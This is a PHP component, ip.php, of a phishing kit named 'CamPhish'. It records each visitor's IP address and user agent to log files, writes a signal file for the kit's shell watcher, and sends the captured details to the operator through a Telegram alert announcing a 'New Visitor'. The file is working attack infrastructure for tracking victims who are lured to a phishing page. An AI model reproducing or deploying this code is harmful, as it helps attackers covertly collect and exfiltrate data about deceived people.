<?php
// ip.php — logs visitor IP and fires Telegram alert
require_once __DIR__ . '/telegram_alert.php';

$ip   = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
// Take only the first IP if X-Forwarded-For has multiple
$ip   = trim(explode(',', $ip)[0]);
$ua   = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$date = date('dMYHis');
$ts   = date('d-M-Y H:i:s');

$log_dir = __DIR__ . '/logs/ip';
if (!is_dir($log_dir)) mkdir($log_dir, 0755, true);

// ── Rate-limit: only log the same IP once per 30 seconds ─────────────────────
$rate_file = $log_dir . '/rate_' . md5($ip) . '.tmp';
if (file_exists($rate_file) && (time() - filemtime($rate_file)) < 30) {
    // Already logged this IP recently — silently respond
    header('Content-Type: application/json');
    echo json_encode(['status' => 'ok']);
    exit();
}
// Refresh rate-limit timestamp
touch($rate_file);

// ── Per-visit file ─────────────────────────────────────────────────────────────
$entry  = "=== Visitor Log ===\n";
$entry .= "Date: $ts\n";
$entry .= "IP: $ip\n";
$entry .= "User-Agent: $ua\n";
$entry .= str_repeat('=', 40) . "\n";

file_put_contents($log_dir . '/ip_' . $date . '.txt', $entry);

// ── Master log (append) ────────────────────────────────────────────────────────
file_put_contents($log_dir . '/saved.ip.txt', $entry, FILE_APPEND);

// ── Signal file for camphish.sh watcher (create fresh, not append) ────────────
file_put_contents($log_dir . '/ip.log', "ip\n");

// ── Telegram alert ─────────────────────────────────────────────────────────────
telegram_alert("🎯 <b>CamPhish — New Visitor!</b>\n📡 IP: <code>$ip</code>\n🌐 UA: <code>" . htmlspecialchars($ua) . "</code>\n🕐 $ts");

header('Content-Type: application/json');
echo json_encode(['status' => 'ok']);
exit();
